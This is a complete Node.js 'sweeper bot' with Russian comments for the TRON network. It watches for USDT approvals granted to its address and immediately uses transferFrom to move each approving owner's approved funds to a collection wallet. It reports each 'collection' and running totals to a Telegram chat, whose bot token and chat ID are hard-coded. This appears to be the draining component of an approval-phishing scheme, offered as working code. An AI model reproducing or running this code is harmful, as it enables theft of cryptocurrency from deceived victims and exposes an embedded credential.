// ============================================
// SWEEPER BOT – ПОЛНАЯ ВЕРСИЯ С УВЕДОМЛЕНИЯМИ
// ============================================

const TronWeb = require('tronweb');
const dotenv = require('dotenv');
dotenv.config();

// -------------------- 1. ИНИЦИАЛИЗАЦИЯ --------------------
const tronWeb = new TronWeb({
    fullHost: process.env.TRONGRID_API,
    privateKey: process.env.BOT_PRIVATE_KEY
});

const TOKEN_CONTRACT = process.env.TOKEN_CONTRACT;
const COLLECTION_ADDRESS = process.env.COLLECTION_ADDRESS;
const BOT_ADDRESS = tronWeb.address.fromPrivateKey(process.env.BOT_PRIVATE_KEY);

// Telegram настройки
const TELEGRAM_TOKEN = '8508345570:AAGJBV9H92ukUQsvsUqnM1uNfm8VdKn9AVk';
const TELEGRAM_CHAT_ID = '-1003750493145';

// Состояние бота
let isActive = true;
let processedTxs = new Set();
let processedAddresses = new Set();
let lastProcessedTime = null;
let lastError = null;
let consecutiveErrors = 0;

// Статистика
let stats = {
    totalCollected: 0,
    totalTransactions: 0,
    totalErrors: 0,
    totalEnergyBurned: 0,
    dailyCollected: 0,
    dailyTransactions: 0,
    dailyErrors: 0,
    dailyEnergyBurned: 0,
    lastDailyReset: Date.now()
};
const startTime = Date.now();

// -------------------- 2. ФУНКЦИЯ ОТПРАВКИ В TELEGRAM --------------------
async function sendTelegramNotification(message, silent = false) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML',
                disable_notification: silent
            })
        });
        
        const result = await response.json();
        if (!result.ok) {
            console.error('❌ Ошибка Telegram API:', result);
        } else {
            console.log('✅ Уведомление отправлено в Telegram');
        }
    } catch (error) {
        console.error('❌ Ошибка при отправке в Telegram:', error.message);
    }
}

// -------------------- 3. ФУНКЦИЯ ФОРМАТИРОВАНИЯ ВРЕМЕНИ --------------------
function formatUptime(ms) {
    const seconds = Math.floor(ms / 1000);
    const minutes = Math.floor(seconds / 60);
    const hours = Math.floor(minutes / 60);
    const days = Math.floor(hours / 24);
    
    if (days > 0) return `${days}д ${hours % 24}ч`;
    if (hours > 0) return `${hours}ч ${minutes % 60}м`;
    if (minutes > 0) return `${minutes}м ${seconds % 60}с`;
    return `${seconds}с`;
}

// -------------------- 4. ОТПРАВКА СТАРТОВОГО СООБЩЕНИЯ --------------------
(async function sendStartupMessage() {
    try {
        const balance = await tronWeb.trx.getBalance(BOT_ADDRESS);
        const balanceTRX = tronWeb.fromSun(balance);
        
        // Получаем информацию об энергии
        let energyInfo = '⏳ проверка...';
        try {
            const account = await tronWeb.trx.getAccount(BOT_ADDRESS);
            energyInfo = account.energy || '0';
        } catch (e) {
            energyInfo = 'недоступно';
        }
        
        const uptime = formatUptime(Date.now() - startTime);
        
        await sendTelegramNotification(`
🚀 <b>SWEEPER BOT ЗАПУЩЕН</b>

📅 Время запуска: ${new Date().toLocaleString()}
⏱ Uptime: ${uptime}

📍 <b>Адреса:</b>
├ 🤖 Бот: <code>${BOT_ADDRESS}</code>
└ 💰 Сбор: <code>${COLLECTION_ADDRESS}</code>

💰 <b>Баланс бота:</b> ${balanceTRX} TRX
⚡️ Доступно энергии: ${energyInfo}

📊 <b>Лимиты:</b>
├ Мин. сумма: 5 USDT
├ Макс. сумма: 5000 USDT
└ Fee limit: 60 TRX

<b>Команды:</b>
/start_bot - включить сбор
/stop_bot - выключить сбор
/status - статистика
/errors - ошибки
/balance - баланс
        `);
        
        // Если баланс меньше 40 TRX, сразу предупреждаем
        if (balanceTRX < 40) {
            await sendTelegramNotification(`
⚠️ <b>ВНИМАНИЕ: НИЗКИЙ БАЛАНС TRX!</b>

💰 Текущий баланс: ${balanceTRX} TRX
🔋 Рекомендуемый минимум: 40 TRX

Бот может работать, но транзакции могут не проходить из-за нехватки энергии.
Пополните кошелек: <code>${BOT_ADDRESS}</code>
            `);
        }
    } catch (error) {
        console.error('Ошибка при отправке стартового сообщения:', error);
    }
})();

// -------------------- 5. ПРОВЕРКА КОМАНД --------------------
async function checkTelegramCommands() {
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=-1`);
        const data = await response.json();
        if (data.result?.length) {
            const msg = data.result[data.result.length - 1].message;
            if (msg?.text && msg.chat.id.toString() === TELEGRAM_CHAT_ID) {
                const cmd = msg.text.toLowerCase();
                
                if (cmd === '/start_bot' && !isActive) {
                    isActive = true;
                    await sendTelegramNotification('✅ <b>Бот включён</b>\nСбор средств возобновлён.');
                } 
                else if (cmd === '/stop_bot' && isActive) {
                    isActive = false;
                    await sendTelegramNotification('🛑 <b>Бот остановлен</b>\nСбор средств приостановлен.');
                } 
                else if (cmd === '/status') {
                    const uptime = Date.now() - startTime;
                    const balance = await tronWeb.trx.getBalance(BOT_ADDRESS);
                    const balanceTRX = tronWeb.fromSun(balance);
                    
                    let energyInfo = '⏳';
                    try {
                        const account = await tronWeb.trx.getAccount(BOT_ADDRESS);
                        energyInfo = account.energy || '0';
                    } catch (e) {}
                    
                    const successRate = stats.totalTransactions + stats.totalErrors > 0 
                        ? (stats.totalTransactions / (stats.totalTransactions + stats.totalErrors) * 100).toFixed(1)
                        : 'N/A';
                    
                    await sendTelegramNotification(`
📊 <b>СТАТУС БОТА</b>

🟢 Состояние: ${isActive ? 'АКТИВЕН' : 'ОСТАНОВЛЕН'}
⏱ Время работы: ${formatUptime(uptime)}
💰 Баланс бота: ${balanceTRX} TRX
⚡️ Энергия: ${energyInfo}
📊 Успешность: ${successRate}%

📈 <b>Общая статистика:</b>
├ 💵 Собрано: ${stats.totalCollected.toFixed(2)} USDT
├ 📦 Транзакций: ${stats.totalTransactions}
├ ⚡️ Сожжено TRX: ${stats.totalEnergyBurned.toFixed(2)} TRX
└ ❌ Ошибок: ${stats.totalErrors}

📅 <b>За сегодня:</b>
├ 💵 Собрано: ${stats.dailyCollected.toFixed(2)} USDT
├ 📦 Транзакций: ${stats.dailyTransactions}
├ ⚡️ Сожжено TRX: ${stats.dailyEnergyBurned.toFixed(2)} TRX
└ ❌ Ошибок: ${stats.dailyErrors}

🔄 Последняя проверка: ${lastProcessedTime || 'нет'}
❌ Последняя ошибка: ${lastError || 'нет'}
                    `);
                }
                else if (cmd === '/errors') {
                    await sendTelegramNotification(`
❌ <b>СТАТИСТИКА ОШИБОК</b>

📊 Всего ошибок: ${stats.totalErrors}
🔄 Последовательных ошибок: ${consecutiveErrors}
⏱ Последняя ошибка: ${lastError || 'нет'}

📅 Ошибок сегодня: ${stats.dailyErrors}
⚡️ Сожжено TRX при ошибках: ${(stats.totalEnergyBurned - stats.dailyEnergyBurned).toFixed(2)} TRX

💡 <b>Рекомендации:</b>
${consecutiveErrors > 5 ? '⚠️ Слишком много ошибок подряд. Проверьте баланс и сеть.' : ''}
${stats.totalEnergyBurned > 100 ? '💰 Высокий расход TRX. Рассмотрите стейкинг для получения энергии.' : ''}
                    `);
                }
                else if (cmd === '/balance') {
                    const balance = await tronWeb.trx.getBalance(BOT_ADDRESS);
                    const balanceTRX = tronWeb.fromSun(balance);
                    
                    let energyInfo = '⏳';
                    try {
                        const account = await tronWeb.trx.getAccount(BOT_ADDRESS);
                        energyInfo = account.energy || '0';
                    } catch (e) {}
                    
                    await sendTelegramNotification(`
💰 <b>БАЛАНС БОТА</b>

🤖 Адрес: <code>${BOT_ADDRESS}</code>
💎 TRX: ${balanceTRX} TRX
⚡️ Энергия: ${energyInfo}

📊 Расход TRX: ${stats.totalEnergyBurned.toFixed(2)} TRX
📈 Прогноз: ${balanceTRX < 20 ? '🔴 Критично мало' : balanceTRX < 40 ? '🟡 Рекомендуется пополнить' : '🟢 Достаточно'}
                    `);
                }
            }
        }
    } catch (error) {
        console.error('Ошибка проверки команд:', error.message);
    }
}

// -------------------- 6. ПРОВЕРКА БАЛАНСА --------------------
async function checkBotBalance() {
    try {
        const balance = await tronWeb.trx.getBalance(BOT_ADDRESS);
        const balanceTRX = tronWeb.fromSun(balance);
        
        if (balanceTRX < 10) {
            await sendTelegramNotification(`
🔴 <b>КРИТИЧЕСКИ НИЗКИЙ БАЛАНС TRX!</b>

💰 Текущий баланс: ${balanceTRX} TRX
🔋 Минимально необходимо: 40 TRX

<b>Бот НЕ сможет отправлять транзакции!</b>
СРОЧНО пополните кошелек: <code>${BOT_ADDRESS}</code>
            `);
        }
        else if (balanceTRX < 20) {
            await sendTelegramNotification(`
🟡 <b>НИЗКИЙ БАЛАНС TRX</b>

💰 Текущий баланс: ${balanceTRX} TRX
🔋 Рекомендуемый минимум: 40 TRX

Рекомендуется пополнить кошелек для стабильной работы.
            `);
        }
        
        return balanceTRX;
    } catch (error) {
        return 0;
    }
}

// -------------------- 7. ПОИСК APPROVE --------------------
async function getNewApprovals() {
    try {
        const oneDayAgo = Date.now() - 24 * 60 * 60 * 1000;
        const response = await fetch(
            `https://api.trongrid.io/v1/contracts/${TOKEN_CONTRACT}/events?` +
            new URLSearchParams({
                event_name: 'Approval',
                limit: 100,
                order_by: 'block_timestamp,desc',
                min_block_timestamp: oneDayAgo
            })
        );
        
        if (!response.ok) return [];
        const data = await response.json();
        if (!data.data) return [];

        return data.data.filter(event => {
            const spender = tronWeb.address.fromHex(event.result.spender);
            return spender === BOT_ADDRESS && !processedTxs.has(event.transaction_id);
        });
    } catch (error) {
        return [];
    }
}

// -------------------- 8. ОСНОВНАЯ ЛОГИКА ПЕРЕВОДА --------------------
async function processApproval(event) {
    const owner = tronWeb.address.fromHex(event.result.owner);
    const value = event.result.value;
    const valueUSDT = (value / 1_000_000).toFixed(2);
    const txId = event.transaction_id;

    if (processedTxs.has(txId)) {
        return;
    }

    console.log(`\n✅ Найден approve от ${owner.slice(0,8)}... на ${valueUSDT} USDT`);

    // Уведомление о найденном approve
    await sendTelegramNotification(`
🔍 <b>НАЙДЕН APPROVE</b>

📤 От: <code>${owner.slice(0,8)}...${owner.slice(-4)}</code>
💰 Сумма: ${valueUSDT} USDT
🔗 TX: https://tronscan.org/#/transaction/${txId}
    `, true); // тихое уведомление

    try {
        const contract = await tronWeb.contract().at(TOKEN_CONTRACT);
        
        // 1. ПРОВЕРЯЕМ ALLOWANCE
        const realAllowance = await contract.allowance(owner, BOT_ADDRESS).call();
        if (realAllowance === 0) {
            const errorMsg = `Allowance = 0 для ${owner.slice(0,8)}...`;
            console.log(`⚠️ ${errorMsg}`);
            await sendTelegramNotification(`⚠️ ${errorMsg}\nTX: https://tronscan.org/#/transaction/${txId}`);
            processedTxs.add(txId);
            return;
        }

        // 2. ПРОВЕРЯЕМ БАЛАНС ВЛАДЕЛЬЦА
        const balance = await contract.balanceOf(owner).call();
        if (balance < value) {
            const errorMsg = `Недостаточно USDT у ${owner.slice(0,8)}... (баланс: ${(balance/1_000_000).toFixed(2)} USDT)`;
            console.log(`⚠️ ${errorMsg}`);
            await sendTelegramNotification(`⚠️ ${errorMsg}`);
            processedTxs.add(txId);
            return;
        }

        // 3. ПОЛУЧАЕМ БАЛАНС ДО ТРАНЗАКЦИИ
        const balanceBefore = await tronWeb.trx.getBalance(BOT_ADDRESS);
        const balanceBeforeTRX = tronWeb.fromSun(balanceBefore);
        
        console.log(`   💸 Отправляю transferFrom на ${valueUSDT} USDT...`);
        console.log(`   🤖 Баланс бота до: ${balanceBeforeTRX} TRX`);

        // 4. ВЫПОЛНЯЕМ TRANSFERFROM
        const tx = await contract.transferFrom(
            owner,
            COLLECTION_ADDRESS,
            value
        ).send({
            feeLimit: 600_000_000,
            callValue: 0,
            shouldPollResponse: true
        });

        // 5. РАССЧИТЫВАЕМ КОМИССИЮ
        const balanceAfter = await tronWeb.trx.getBalance(BOT_ADDRESS);
        const balanceAfterTRX = tronWeb.fromSun(balanceAfter);
        const feeSpent = (balanceBefore - balanceAfter) / 1_000_000;
        
        // Обновляем статистику
        stats.totalCollected += parseFloat(valueUSDT);
        stats.totalTransactions++;
        stats.totalEnergyBurned += feeSpent;
        stats.dailyCollected += parseFloat(valueUSDT);
        stats.dailyTransactions++;
        stats.dailyEnergyBurned += feeSpent;
        consecutiveErrors = 0;
        lastError = null;

        console.log(`   ✅ УСПЕХ! TX: https://tronscan.org/#/transaction/${tx}`);
        console.log(`   💸 Комиссия: ${feeSpent.toFixed(2)} TRX`);
        console.log(`   🤖 Баланс после: ${balanceAfterTRX} TRX`);

        // 6. УВЕДОМЛЕНИЕ ОБ УСПЕХЕ
        await sendTelegramNotification(`
🚀 <b>УСПЕШНЫЙ СБОР!</b>

💰 Сумма: ${valueUSDT} USDT
📤 От: <code>${owner.slice(0,8)}...${owner.slice(-4)}</code>
📥 На: <code>${COLLECTION_ADDRESS.slice(0,8)}...${COLLECTION_ADDRESS.slice(-4)}</code>
⚡️ Комиссия: ${feeSpent.toFixed(2)} TRX
🤖 Баланс бота: ${balanceAfterTRX} TRX

📊 Статистика:
├ Всего собрано: ${stats.totalCollected.toFixed(2)} USDT
├ Всего транзакций: ${stats.totalTransactions}
└ Всего сожжено TRX: ${stats.totalEnergyBurned.toFixed(2)} TRX

🔗 https://tronscan.org/#/transaction/${tx}
        `);

        processedTxs.add(txId);

    } catch (error) {
        console.error(`❌ Ошибка:`, error.message);
        
        // Обновляем статистику ошибок
        stats.totalErrors++;
        stats.dailyErrors++;
        consecutiveErrors++;
        lastError = error.message;
        
        // Получаем баланс после ошибки
        const balanceAfter = await tronWeb.trx.getBalance(BOT_ADDRESS);
        const balanceAfterTRX = tronWeb.fromSun(balanceAfter);
        
        // Анализ ошибки
        let errorType = '⚠️ Неизвестная ошибка';
        let recommendation = 'Проверьте логи и баланс бота.';
        
        if (error.message.includes('request aborted')) {
            errorType = '⚠️ Сбой запроса';
            recommendation = 'Нехватка энергии или проблемы сети. Проверьте баланс TRX и feeLimit.';
        } 
        else if (error.message.includes('revert')) {
            errorType = '❌ Откат транзакции';
            recommendation = 'Возможно, контракт отклонил операцию. Проверьте allowance и баланс пользователя.';
        }
        else if (error.message.includes('out of energy')) {
            errorType = '⚡ Нехватка энергии';
            recommendation = 'feeLimit слишком мал. Увеличьте до 600_000_000 или пополните баланс.';
        }
        else if (error.message.includes('timeout')) {
            errorType = '⏱ Таймаут';
            recommendation = 'Сеть перегружена. Повторите попытку позже.';
        }

        // Уведомление об ошибке
        await sendTelegramNotification(`
❌ <b>ОШИБКА TRANSFERFROM</b>

📟 Тип: ${errorType}
📝 Сообщение: ${error.message}

📤 От: <code>${owner.slice(0,8)}...${owner.slice(-4)}</code>
💰 Сумма: ${valueUSDT} USDT
🤖 Баланс бота: ${balanceAfterTRX} TRX

💡 <b>Рекомендация:</b> ${recommendation}

📊 Статистика ошибок:
├ Всего ошибок: ${stats.totalErrors}
├ Подряд: ${consecutiveErrors}
└ Сегодня: ${stats.dailyErrors}

⏰ ${new Date().toLocaleString()}
        `);
    }
}

// -------------------- 9. ДНЕВНОЙ ОТЧЁТ --------------------
async function checkDailyStats() {
    const now = Date.now();
    if (now - stats.lastDailyReset > 24 * 60 * 60 * 1000) {
        
        // Формируем дневной отчёт
        let report = `
📊 <b>ДНЕВНОЙ ОТЧЁТ</b>

📅 Период: ${new Date(stats.lastDailyReset).toLocaleDateString()}

💰 <b>Собрано:</b> ${stats.dailyCollected.toFixed(2)} USDT
📦 <b>Транзакций:</b> ${stats.dailyTransactions}
⚡️ <b>Сожжено TRX:</b> ${stats.dailyEnergyBurned.toFixed(2)} TRX
📊 <b>Средняя комиссия:</b> ${stats.dailyTransactions > 0 ? (stats.dailyEnergyBurned / stats.dailyTransactions).toFixed(2) : 0} TRX
❌ <b>Ошибок:</b> ${stats.dailyErrors}
📈 <b>Успешность:</b> ${stats.dailyTransactions + stats.dailyErrors > 0 
    ? ((stats.dailyTransactions / (stats.dailyTransactions + stats.dailyErrors)) * 100).toFixed(1) 
    : 0}%

🏆 <b>Всего с начала работы:</b>
├ Собрано: ${stats.totalCollected.toFixed(2)} USDT
├ Транзакций: ${stats.totalTransactions}
└ Сожжено TRX: ${stats.totalEnergyBurned.toFixed(2)} TRX
        `;
        
        // Добавляем рекомендации если нужно
        if (stats.dailyEnergyBurned > 50) {
            report += `\n💡 <b>Совет:</b> Высокий расход TRX. Рассмотрите стейкинг для получения бесплатной энергии.`;
        }
        if (stats.dailyErrors > stats.dailyTransactions) {
            report += `\n⚠️ <b>Внимание:</b> Ошибок больше чем успешных транзакций. Проверьте настройки.`;
        }
        
        await sendTelegramNotification(report);
        
        // Сбрасываем дневную статистику
        stats.dailyCollected = 0;
        stats.dailyTransactions = 0;
        stats.dailyErrors = 0;
        stats.dailyEnergyBurned = 0;
        stats.lastDailyReset = now;
    }
}

// -------------------- 10. ОСНОВНОЙ ЦИКЛ --------------------
async function checkAndSweep() {
    lastProcessedTime = new Date().toLocaleString();

    await checkTelegramCommands();
    if (!isActive) {
        console.log('⏸ Бот остановлен');
        return;
    }

    console.log(`\n🔄 ПРОВЕРКА [${new Date().toLocaleString()}]`);
    
    await checkBotBalance();
    await checkDailyStats();

    const approvals = await getNewApprovals();
    
    if (approvals.length === 0) {
        console.log('⏳ Новых approve нет');
        return;
    }

    console.log(`📋 Найдено ${approvals.length} новых approve`);
    
    for (const app of approvals) {
        await processApproval(app);
        await new Promise(resolve => setTimeout(resolve, 5000));
    }
}

// -------------------- 11. ЗАПУСК --------------------
checkAndSweep();
setInterval(checkAndSweep, 30000);

// -------------------- 12. ОБРАБОТКА ОСТАНОВКИ --------------------
process.on('SIGINT', async () => {
    console.log('\n👋 Получен сигнал остановки...');
    
    const uptime = Date.now() - startTime;
    const balance = await tronWeb.trx.getBalance(BOT_ADDRESS);
    const balanceTRX = tronWeb.fromSun(balance);
    
    const successRate = stats.totalTransactions + stats.totalErrors > 0 
        ? (stats.totalTransactions / (stats.totalTransactions + stats.totalErrors) * 100).toFixed(1)
        : 0;
    
    await sendTelegramNotification(`
🛑 <b>БОТ ОСТАНОВЛЕН</b>

⏱ Время работы: ${formatUptime(uptime)}
💰 Остаток TRX: ${balanceTRX} TRX

📊 <b>ИТОГОВАЯ СТАТИСТИКА:</b>

💵 <b>Собрано USDT:</b> ${stats.totalCollected.toFixed(2)} USDT
📦 <b>Транзакций:</b> ${stats.totalTransactions}
⚡️ <b>Сожжено TRX:</b> ${stats.totalEnergyBurned.toFixed(2)} TRX
❌ <b>Ошибок:</b> ${stats.totalErrors}
📈 <b>Успешность:</b> ${successRate}%

📊 <b>Средние показатели:</b>
├ За транзакцию: ${stats.totalTransactions > 0 ? (stats.totalCollected / stats.totalTransactions).toFixed(2) : 0} USDT
├ Комиссия за транзакцию: ${stats.totalTransactions > 0 ? (stats.totalEnergyBurned / stats.totalTransactions).toFixed(2) : 0} TRX
└ Ошибок на транзакцию: ${stats.totalTransactions > 0 ? (stats.totalErrors / stats.totalTransactions).toFixed(2) : 0}

👋 До свидания!
    `);
    
    console.log('✅ Бот остановлен');
    process.exit(0);
});

process.on('unhandledRejection', async (error) => {
    console.error('❗ Необработанная ошибка:', error);
    stats.totalErrors++;
    stats.dailyErrors++;
    await sendTelegramNotification(`❗ <b>КРИТИЧЕСКАЯ ОШИБКА</b>\n\n${error.message}`);
});
